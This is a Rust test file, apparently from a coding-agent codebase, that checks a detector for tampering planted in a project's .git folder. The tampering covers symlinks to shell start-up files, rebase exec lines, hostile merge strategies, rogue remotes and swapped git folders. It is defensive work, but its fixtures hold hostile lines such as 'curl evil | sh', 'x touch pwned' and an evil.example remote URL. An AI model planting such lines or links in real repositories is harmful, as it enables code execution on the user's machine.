#![allow(clippy::expect_used)]

use super::unix::Finding;
use super::unix::check;
use super::unix::exec_lines;
use super::unix::held_for;
use super::unix::report;
use super::*;
use codex_protocol::ThreadId;
use pretty_assertions::assert_eq;
use std::os::unix::fs::MetadataExt;
use std::os::unix::fs::PermissionsExt;
use std::os::unix::fs::symlink;
use std::path::Path;
use std::path::PathBuf;
use std::time::Duration;
use std::time::SystemTime;
use tempfile::TempDir;

/// A project with a minimal git folder, and a place outside it.
struct Project {
    _dir: TempDir,
    base: PathBuf,
    root: PathBuf,
    outside: PathBuf,
}

impl Project {
    fn new() -> Self {
        let dir = TempDir::new().expect("temp dir");
        let base = dir.path().canonicalize().expect("canonical");
        let root = base.join("project");
        let git = root.join(".git");
        for folder in ["objects/ab", "refs/heads", "logs/refs/heads", "hooks"] {
            std::fs::create_dir_all(git.join(folder)).expect("git folder");
        }
        std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
        std::fs::write(git.join("config"), "[core]\n").expect("config");
        std::fs::write(git.join("logs/HEAD"), "").expect("log");
        std::fs::write(git.join("refs/heads/main"), "0\n").expect("ref");
        let outside = base.join("outside");
        std::fs::create_dir_all(&outside).expect("outside");
        std::fs::write(outside.join("zshrc"), "# shell start-up\n").expect("target");
        Project {
            _dir: dir,
            base,
            root,
            outside,
        }
    }

    fn git(&self) -> PathBuf {
        self.root.join(".git")
    }

    fn repos(&self) -> Vec<Repo> {
        repos(&[self.root.join("src").as_path(), self.root.as_path()])
    }

    /// What holds the rules for this project (and its linked worktree).
    fn held(&self) -> Vec<String> {
        held_for(&[self.git()])
    }
}

/// A first look, as before a command, for a fresh session.
fn baseline(project: &Project) -> (ThreadId, Vec<Repo>) {
    let thread = ThreadId::new();
    let repos = project.repos();
    assert_eq!(repos.len(), 1, "one repository");
    assert_eq!(begin(thread, &repos, "Moderate"), None, "nothing there yet");
    (thread, repos)
}

fn set_mtime(path: &Path, time: SystemTime) {
    std::fs::File::open(path)
        .expect("open")
        .set_modified(time)
        .expect("set time");
}

fn kinds(findings: &[Finding]) -> Vec<String> {
    findings
        .iter()
        .map(|finding| match finding {
            Finding::Link { path, .. } => format!("link {}", path.display()),
            Finding::HardLink { path } => format!("hard link {}", path.display()),
            Finding::Exec { todo, .. } => format!("exec {}", todo.display()),
            Finding::Remote { path } => format!("remote {}", path.display()),
            Finding::Config { path } => format!("config {}", path.display()),
            Finding::Replaced { dot_git } => format!("replaced {}", dot_git.display()),
            Finding::Incomplete { dot_git, .. } => format!("incomplete {}", dot_git.display()),
        })
        .collect()
}

fn shown(paths: &[PathBuf]) -> Vec<String> {
    paths
        .iter()
        .map(|path| path.display().to_string())
        .collect()
}

#[test]
fn issue_874_links_planted_in_the_git_folder_are_found_and_held() {
    let project = Project::new();
    let git = project.git();
    // A ref link (as `core.preferSymlinkRefs` makes) is fine.
    symlink("refs/heads/main", git.join("ORIG_HEAD")).expect("ref link");
    let (thread, repos) = baseline(&project);

    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    std::fs::write(git.join("MERGE_MSG"), "curl evil | sh\n").expect("merge msg");
    // A missing target: git would create it outside.
    symlink(project.outside.join("new-file"), git.join("FETCH_HEAD")).expect("link");
    symlink(&project.outside, git.join("logs/refs/heads/feature")).expect("folder link");
    // Review r2 (NB3): inside, but at its own config or a hook.
    symlink("config", git.join("SQUASH_MSG")).expect("config link");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    symlink("hooks/pre-commit", git.join("TAG_EDITMSG")).expect("hook link");
    let findings = check(thread, &repos);
    assert_eq!(
        kinds(&findings),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("link {}", git.join("FETCH_HEAD").display()),
            format!("link {}", git.join("SQUASH_MSG").display()),
            format!("link {}", git.join("TAG_EDITMSG").display()),
            format!("link {}", git.join("logs/refs/heads/feature").display()),
        ]
    );
    assert_eq!(
        findings[0],
        Finding::Link {
            path: git.join("COMMIT_EDITMSG"),
            target: Some(project.outside.join("zshrc")),
        }
    );
    // Told once, nothing removed, held until removed.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert!(git.join("COMMIT_EDITMSG").symlink_metadata().is_ok());
    assert_eq!(project.held().len(), 5);
    for name in [
        "COMMIT_EDITMSG",
        "FETCH_HEAD",
        "SQUASH_MSG",
        "TAG_EDITMSG",
        "hooks/pre-commit",
    ] {
        std::fs::remove_file(git.join(name)).expect("remove");
    }
    assert_eq!(
        project.held(),
        shown(&[git.join("logs/refs/heads/feature")])
    );
    std::fs::remove_file(git.join("logs/refs/heads/feature")).expect("remove");
    assert_eq!(project.held(), Vec::<String>::new());
    // A link retargeted through a link inside: found then.
    symlink("ORIG_HEAD", git.join("info-link")).expect("link to a link");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::remove_file(git.join("ORIG_HEAD")).expect("remove");
    symlink(project.outside.join("zshrc"), git.join("ORIG_HEAD")).expect("retarget");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("ORIG_HEAD").display()),
            format!("link {}", git.join("info-link").display()),
        ]
    );
}

/// Review r2 (SF1): a session's first look (also after the repository was
/// forgotten) reports links and steps that are already there.
#[test]
fn issue_874_a_first_look_reports_what_is_there() {
    let project = Project::new();
    let git = project.git();
    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(git.join("rebase-merge/git-rebase-todo"), "x touch pwned\n").expect("todo");
    // Not reported at a first look: an ordinary repository may have these.
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(git.join("remotes/origin"), "URL: x\n").expect("remote");
    let repos = project.repos();
    let message = begin(ThreadId::new(), &repos, "Moderate").expect("reported");
    assert!(message.contains("COMMIT_EDITMSG"), "{message}");
    assert!(message.contains("x touch pwned"), "{message}");
    assert!(!message.contains("remotes"), "{message}");
    assert_eq!(project.held().len(), 2);
}

/// Review r1 (B4): a chain through `refs` that ends at a missing file
/// outside; (S9) a folder link in `refs`; only the objects' fan-out folders
/// go unvisited.
#[test]
fn issue_874_chains_refs_and_objects() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    symlink(project.outside.join(".zlogin"), git.join("refs/x")).expect("ref link");
    symlink("refs/x", git.join("COMMIT_EDITMSG")).expect("chain");
    symlink(&project.outside, git.join("refs/tags")).expect("folder link");
    symlink(project.outside.join("zshrc"), git.join("objects/evil")).expect("object link");
    // Git reads objects below the fan-out folders; not looked at.
    symlink(project.outside.join("zshrc"), git.join("objects/ab/cdef")).expect("object");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("link {}", git.join("objects/evil").display()),
            format!("link {}", git.join("refs/tags").display()),
            format!("link {}", git.join("refs/x").display()),
        ]
    );
}

/// Review r1 (B1): setting a folder's or todo's modification time back
/// doesn't hide a change (the status-change time moves anyway).
#[test]
fn issue_874_restored_modification_times_hide_nothing() {
    let project = Project::new();
    let git = project.git();
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(git.join("rebase-merge/git-rebase-todo"), "pick 1234 abcd\n").expect("todo");
    let (thread, repos) = baseline(&project);
    // Past the window in which a just-changed folder is listed again.
    std::thread::sleep(Duration::from_millis(/*millis*/ 2_200));
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    let folder_time = git.metadata().expect("meta").modified().expect("time");
    let todo = git.join("rebase-merge/git-rebase-todo");
    let todo_time = todo.metadata().expect("meta").modified().expect("time");
    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    set_mtime(&git, folder_time);
    // Same size, in place.
    std::fs::OpenOptions::new()
        .write(true)
        .open(&todo)
        .and_then(|mut file| std::io::Write::write_all(&mut file, b"x touch pwnd12\n"))
        .expect("rewrite");
    set_mtime(&todo, todo_time);
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("COMMIT_EDITMSG").display()),
            format!("exec {}", todo.display()),
        ]
    );
}

/// Review r1 (B2): a folder made to look like a git folder doesn't stop
/// the look below it.
#[test]
fn issue_874_a_fake_git_folder_hides_nothing() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    // `logs` has a `HEAD` already.
    std::fs::create_dir_all(git.join("logs/objects")).expect("fake objects");
    symlink(
        project.outside.join("zshrc"),
        git.join("logs/refs/heads/main"),
    )
    .expect("link");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!(
            "link {}",
            git.join("logs/refs/heads/main").display()
        )]
    );
}

/// Review r1 (B3): a git folder that can't be listed holds, and says so
/// each time it becomes so.
#[test]
fn issue_874_an_unreadable_git_folder_holds() {
    // Root reads any folder.
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o311)).expect("chmod");
    let findings = check(thread, &repos);
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(
        kinds(&findings),
        vec![format!("incomplete {}", git.display())]
    );
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o311)).expect("chmod");
    let held = project.held();
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(held, vec![format!("{} (not checked fully)", git.display())]);
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
}

#[test]
fn issue_874_hard_links_and_legacy_remotes_are_found() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::hard_link(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG"))
        .expect("hard link");
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(git.join("remotes/origin"), "URL: https://evil.example/x\n").expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("hard link {}", git.join("COMMIT_EDITMSG").display()),
            format!("remote {}", git.join("remotes/origin").display()),
        ]
    );
    // A changed definition is found again.
    std::fs::write(
        git.join("remotes/origin"),
        "URL: https://other.example/repository\n",
    )
    .expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("remote {}", git.join("remotes/origin").display())]
    );
    // Review r2 (SF3, nit 3, SF6): git links packs into place; a remote's
    // name may hold a slash; new config, commondir and hooks are reported.
    std::fs::create_dir_all(git.join("objects/pack")).expect("pack folder");
    std::fs::write(git.join("objects/pack/tmp_pack_1"), "pack").expect("pack");
    std::fs::hard_link(
        git.join("objects/pack/tmp_pack_1"),
        git.join("objects/pack/pack-1.pack"),
    )
    .expect("pack link");
    std::fs::create_dir_all(git.join("remotes/team")).expect("remotes");
    std::fs::write(git.join("remotes/team/origin"), "URL: x\n").expect("remote");
    std::fs::write(git.join("commondir"), "../elsewhere\n").expect("commondir");
    // Review r3 (B1): a hook added to the existing (protected) folder, and
    // config git rewrites by renaming, are the person's.
    std::fs::write(git.join("hooks/post-checkout"), "#!/bin/sh\n").expect("hook");
    std::fs::write(git.join("config.lock"), "[core]\n\tbare = false\n").expect("lock");
    std::fs::rename(git.join("config.lock"), git.join("config")).expect("rename");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("config {}", git.join("commondir").display()),
            format!("remote {}", git.join("remotes/team/origin").display()),
        ]
    );
    for name in ["commondir", "hooks/post-checkout", "remotes/team/origin"] {
        std::fs::remove_file(git.join(name)).expect("remove");
    }
    // Review r1 (S3): held by what it is, not by its inode.
    std::fs::remove_file(git.join("COMMIT_EDITMSG")).expect("remove");
    std::fs::write(git.join("COMMIT_EDITMSG"), "message\n").expect("regular file");
    std::fs::remove_file(git.join("remotes/origin")).expect("remove");
    assert_eq!(project.held(), Vec::<String>::new());
}

#[test]
fn issue_874_rebase_and_sequencer_exec_lines_are_found() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(
        git.join("rebase-merge/git-rebase-todo"),
        "pick 1234 work\n  x touch pwned\n",
    )
    .expect("todo");
    std::fs::create_dir_all(git.join("sequencer")).expect("sequencer");
    std::fs::write(git.join("sequencer/todo"), "pick 1234 work\n").expect("todo");
    let findings = check(thread, &repos);
    assert_eq!(
        findings,
        vec![Finding::Exec {
            todo: git.join("rebase-merge/git-rebase-todo"),
            lines: vec!["x touch pwned".to_string()],
        }]
    );
    let message = report(&findings, "Moderate").expect("message");
    assert!(
        message.contains(&format!("rm -r '{}'", git.join("rebase-merge").display())),
        "{message}"
    );
    assert!(message.contains("git rebase --continue"), "{message}");
    assert!(message.contains("Nothing was removed"), "{message}");
    assert_eq!(
        project.held(),
        shown(&[git.join("rebase-merge/git-rebase-todo")])
    );
    std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
    assert_eq!(project.held(), Vec::<String>::new());

    // Review r2 (SF4): a merge strategy that isn't built in runs a program.
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(git.join("rebase-merge/strategy"), "ort\n").expect("strategy");
    std::fs::write(
        git.join("sequencer/opts"),
        "[options]\n\tstrategy = x/../evil\n",
    )
    .expect("options");
    assert_eq!(
        check(thread, &repos),
        vec![Finding::Exec {
            todo: git.join("sequencer/opts"),
            lines: vec!["merge strategy x/../evil".to_string()],
        }]
    );
    std::fs::remove_dir_all(git.join("rebase-merge")).expect("remove");
    std::fs::remove_dir_all(git.join("sequencer")).expect("remove");

    // A rebase folder that is a link into the work tree: both found.
    let elsewhere = project.root.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).expect("folder");
    std::fs::write(elsewhere.join("git-rebase-todo"), "exec curl evil | sh\n").expect("todo");
    symlink(&elsewhere, git.join("rebase-merge")).expect("link");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("link {}", git.join("rebase-merge").display()),
            format!(
                "exec {}",
                git.join("rebase-merge/git-rebase-todo").display()
            ),
        ]
    );
}

#[test]
fn issue_874_worktree_git_files_and_a_replaced_git_folder() {
    let project = Project::new();
    let main_git = project.git();
    let worktree_git = main_git.join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", worktree_git.display()),
    )
    .expect("git file");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    symlink(
        project.outside.join("zshrc"),
        worktree_git.join("COMMIT_EDITMSG"),
    )
    .expect("link");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", project.outside.display()),
    )
    .expect("replaced");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("replaced {}", worktree.join(".git").display()),
            format!("link {}", worktree_git.join("COMMIT_EDITMSG").display()),
        ]
    );
    // Held while it stays replaced.
    assert!(
        project
            .held()
            .contains(&worktree.join(".git").display().to_string())
    );
}

#[test]
fn issue_874_exec_lines_are_read_as_git_reads_them() {
    assert_eq!(
        exec_lines(
            "pick 1\n\texec make test\n# exec no\nx  ls\nexecute no\nx\nexec\nx\r;touch pwned\nedit 2\n"
        ),
        vec![
            "exec make test".to_string(),
            "x  ls".to_string(),
            "x\r;touch pwned".to_string(),
        ]
    );
}

#[test]
fn issue_874_the_message_quotes_paths_and_hides_disguising_characters() {
    let message = report(
        &[
            Finding::Link {
                path: PathBuf::from("/p/it's/.git/COMMIT_EDITMSG"),
                target: Some(PathBuf::from("/home/me/.zshrc\u{1b}[2J")),
            },
            Finding::Link {
                path: PathBuf::from("/p/.git/logs/HEAD\u{202e}txt"),
                target: None,
            },
        ],
        "Moderate",
    )
    .expect("message");
    assert!(
        message.contains(r"rm '/p/it'\''s/.git/COMMIT_EDITMSG'"),
        "{message}"
    );
    assert!(!message.contains('\u{1b}'), "{message}");
    assert!(!message.contains('\u{202e}'), "{message}");
    assert!(message.contains("remove it by hand"), "{message}");
}

/// Review r1 (S1): something planted after a command's look (typed into a
/// running shell, or by a process left running) is found, and holds,
/// before the next command is decided, also from another session working
/// in the same project.
#[test]
fn issue_874_the_next_command_looks_again_first() {
    let project = Project::new();
    let git = project.git();
    let (thread, _) = baseline(&project);
    symlink(project.outside.join("zshrc"), git.join("COMMIT_EDITMSG")).expect("link");
    let (message, held) = recheck(thread, "Moderate", &[project.root.as_path()]);
    assert!(!held.is_empty());
    assert!(
        message.is_some_and(|message| message.contains("COMMIT_EDITMSG")),
        "reported"
    );
    // Another session, in the same project: held too.
    let (message, held) = recheck(ThreadId::new(), "Moderate", &[project.root.as_path()]);
    assert_eq!(
        (message, held),
        (None, vec![git.join("COMMIT_EDITMSG").display().to_string()])
    );
    // Elsewhere: not.
    let other = Project::new();
    let (_, held) = recheck(ThreadId::new(), "Moderate", &[other.root.as_path()]);
    assert_eq!(held, Vec::<String>::new());
}

/// Review r3 (S1, B1): a hooks folder made where there was none, hidden
/// behind an unreadable look, is reported once it can be read.
#[test]
fn issue_874_a_new_hooks_folder_behind_an_unreadable_look_is_reported() {
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let project = Project::new();
    let git = project.git();
    std::fs::remove_dir_all(git.join("hooks")).expect("no hooks");
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("hooks")).expect("hooks");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    std::fs::set_permissions(git.join("hooks"), std::fs::Permissions::from_mode(0o000))
        .expect("chmod");
    let first = check(thread, &repos);
    std::fs::set_permissions(git.join("hooks"), std::fs::Permissions::from_mode(0o755))
        .expect("chmod");
    assert_eq!(
        kinds(&first),
        vec![
            format!("config {}", git.join("hooks").display()),
            format!("incomplete {}", git.display()),
        ]
    );
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), shown(&[git.join("hooks")]));
}

/// Review r3 (S2, S4): a removed worktree or clone isn't "replaced" and
/// holds nothing; links in a hooks folder (the person's hook setup) aren't
/// reported, not even at a first look.
#[test]
fn issue_874_removed_repositories_and_hook_links_hold_nothing() {
    let project = Project::new();
    let git = project.git();
    std::fs::write(project.root.join("pre-commit.sh"), "#!/bin/sh\n").expect("script");
    symlink("../../pre-commit.sh", git.join("hooks/pre-commit")).expect("hook link");
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("moved-git")).expect("remove .git");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    std::fs::rename(project.base.join("moved-git"), &git).expect("restore .git");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
}

/// Review r3 (S3): git reads `[options] strategy` in any case and on the
/// section's own line.
#[test]
fn issue_874_strategy_spellings() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("sequencer")).expect("sequencer");
    for opts in [
        "[OPTIONS]\n\tSTRATEGY = x/../evil\n",
        "[options] strategy = \"y/../evil\"\n",
    ] {
        std::fs::write(git.join("sequencer/opts"), opts).expect("options");
        let findings = check(thread, &repos);
        assert!(
            matches!(&findings[..], [Finding::Exec { lines, .. }] if lines[0].contains("/../evil")),
            "{opts:?}: {findings:?}"
        );
    }
}

#[test]
fn issue_874_long_reports_are_cut() {
    let findings: Vec<Finding> = (0..25)
        .map(|n| Finding::Remote {
            path: PathBuf::from(format!("/p/.git/remotes/r{n}")),
        })
        .collect();
    let message = report(&findings, "Moderate").expect("message");
    assert!(message.contains("and 5 more"), "{message}");
    assert!(!message.contains("remotes/r24"), "{message}");
}

/// Review r4 (S1'): a remote hidden behind an unreadable git folder is
/// reported once the folder can be read again.
#[test]
fn issue_874_a_remote_behind_an_unreadable_git_folder_is_reported() {
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::create_dir_all(git.join("remotes")).expect("remotes");
    std::fs::write(
        git.join("remotes/upstream"),
        "URL: https://evil.example/x\n",
    )
    .expect("remote");
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o000)).expect("chmod");
    let hidden = check(thread, &repos);
    std::fs::set_permissions(&git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(
        kinds(&hidden),
        vec![format!("incomplete {}", git.display())]
    );
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("remote {}", git.join("remotes/upstream").display())]
    );
}

/// Review r4 (nit 3): a repository deleted and cloned again in the same
/// place isn't reported as "replaced" (its config and hooks would be as
/// new, #943).
#[test]
fn issue_874_a_recloned_repository_isnt_reported_as_replaced() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::remove_dir_all(&git).expect("delete");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::create_dir_all(git.join("objects")).expect("clone");
    std::fs::create_dir_all(git.join("refs/heads")).expect("clone");
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
}

/// Review r4 (nit 5): a rebase with `-x` is reported when a command line
/// appears, not at each step.
#[test]
fn issue_874_a_rebase_is_reported_when_a_command_appears() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    let todo = git.join("rebase-merge/git-rebase-todo");
    std::fs::create_dir_all(git.join("rebase-merge")).expect("rebase");
    std::fs::write(&todo, "pick 1\nexec make\npick 2\nexec make test\n").expect("todo");
    assert_eq!(check(thread, &repos).len(), 1);
    std::fs::write(&todo, "pick 2\nexec make test\n").expect("step");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::write(&todo, "pick 2\nexec make test\nexec curl evil | sh\n").expect("added");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("exec {}", todo.display())]
    );
}

/// CI (#926): the Linux sandbox leaves empty config files and an empty
/// hooks folder in place as mount points while a command runs, where
/// another session's look sees them. Git runs nothing from them; they are
/// reported once something is put in them.
#[test]
fn issue_874_empty_config_and_hooks_are_reported_once_filled() {
    let project = Project::new();
    let git = project.git();
    std::fs::remove_dir_all(git.join("hooks")).expect("no hooks");
    let (thread, repos) = baseline(&project);
    std::fs::create_dir(git.join("hooks")).expect("empty hooks");
    std::fs::write(git.join("config.worktree"), "").expect("empty config");
    std::fs::write(git.join("commondir"), "").expect("empty commondir");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    // Still empty: still nothing.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    // Filled in place, nothing else changed (the git folder itself doesn't).
    fill(&git.join("config.worktree"));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
    // A hook put in the folder, and a file renamed over the other one.
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    std::fs::write(git.join("commondir.new"), "../elsewhere\n").expect("commondir");
    std::fs::rename(git.join("commondir.new"), git.join("commondir")).expect("rename");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("config {}", git.join("commondir").display()),
            format!("config {}", git.join("hooks").display()),
        ]
    );
    let mut held = project.held();
    held.sort();
    assert_eq!(
        held,
        shown(&[
            git.join("commondir"),
            git.join("config.worktree"),
            git.join("hooks")
        ])
    );
}

/// Review r6 (B1): an empty one is remembered for every session, also after
/// a session forgets the repository: filled later, it is reported at a
/// first look too.
#[test]
fn issue_874_an_empty_config_is_remembered_across_sessions_and_forgetting() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::write(git.join("config.worktree"), "").expect("empty config");
    std::fs::write(git.join("commondir"), "").expect("empty commondir");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    // Another session (a parent after its sub-agent) looks first, then a
    // command there fills it.
    let other = ThreadId::new();
    assert_eq!(begin(other, &repos, "Moderate"), None);
    fill(&git.join("config.worktree"));
    assert_eq!(
        kinds(&check(other, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
    // The first session works in more repositories than it keeps, forgets
    // this one, and a command fills the other file.
    let scratch: Vec<Project> = (0..17).map(|_| Project::new()).collect();
    for project in &scratch {
        check(thread, &project.repos());
    }
    fill(&git.join("commondir"));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("commondir").display())]
    );
    let mut held = project.held();
    held.sort();
    assert_eq!(
        held,
        shown(&[git.join("commondir"), git.join("config.worktree")])
    );
}

/// Appends to `path` in place (its inode unchanged).
fn fill(path: &Path) {
    std::fs::OpenOptions::new()
        .append(true)
        .open(path)
        .and_then(|mut file| std::io::Write::write_all(&mut file, b"x\n"))
        .expect("filled");
}

/// CI (#926): an empty `.git` folder replaced by another (the Linux
/// sandbox's mount point, removed and made again by other commands, with
/// empty mount points of its own in it) isn't reported; what is put in it
/// later is.
#[test]
fn issue_874_an_empty_git_folder_replaced_by_another() {
    let project = Project::new();
    let git = project.git();
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    let (thread, repos) = baseline(&project);
    std::fs::remove_dir(&git).expect("removed");
    std::fs::create_dir(&git).expect("empty .git again");
    std::fs::write(git.join("config"), "").expect("empty config");
    std::fs::create_dir(git.join("hooks")).expect("empty hooks");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
    // #943 (r8 N3): the empty `config` that came with it, filled in place.
    fill(&git.join("config"));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config").display())]
    );
}

/// Review r7 (B1): a full `.git` replaced by an empty folder is reported
/// and held (filled later, a submodule's config there wouldn't be).
#[test]
fn issue_874_a_full_git_folder_replaced_by_an_empty_one() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    assert!(project.held().contains(&git.display().to_string()));
}

/// #943 (r8 N1): after a reported swap for an empty folder, swapping that
/// for another empty folder is reported again, and still held: the hold
/// doesn't lapse unreported. An empty folder never held stays quiet when
/// swapped (the Linux sandbox's mount points, above).
#[test]
fn issue_943_a_held_empty_git_folder_swapped_again_is_reported() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    assert!(project.held().contains(&git.display().to_string()));
    std::fs::rename(&git, project.base.join("first-empty")).expect("moved");
    std::fs::create_dir(&git).expect("another empty .git");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    assert!(project.held().contains(&git.display().to_string()));
}

/// #943 (#1497 review): a `held_for` (of any session) between the second
/// swap and this session's next look drops the first swap's hold, which no
/// longer stands; the second swap is still reported, and held.
#[test]
fn issue_943_a_held_swap_dropped_before_the_next_look_is_still_reported() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    // An unchanged look keeps it held.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::rename(&git, project.base.join("first-empty")).expect("moved");
    std::fs::create_dir(&git).expect("another empty .git");
    // Another session's check prunes the hold that no longer stands.
    assert!(!project.held().contains(&git.display().to_string()));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    assert!(project.held().contains(&git.display().to_string()));
}

/// #943 (#1502 review): a session whose last look saw the empty `.git`
/// before another session reported it as a swap still reports the next swap
/// after that hold was dropped.
#[test]
fn issue_943_a_swap_another_session_reported_is_reported_after_its_hold_went() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("saved-git")).expect("moved");
    std::fs::create_dir(&git).expect("empty .git");
    let other = ThreadId::new();
    assert_eq!(begin(other, &repos, "Moderate"), None);
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    std::fs::rename(&git, project.base.join("first-empty")).expect("moved");
    std::fs::create_dir(&git).expect("another empty .git");
    assert!(!project.held().contains(&git.display().to_string()));
    assert_eq!(
        kinds(&check(other, &repos)),
        vec![format!("replaced {}", git.display())]
    );
    assert!(project.held().contains(&git.display().to_string()));
}

/// Review r7 (B2): another session forgetting an empty one that went (its
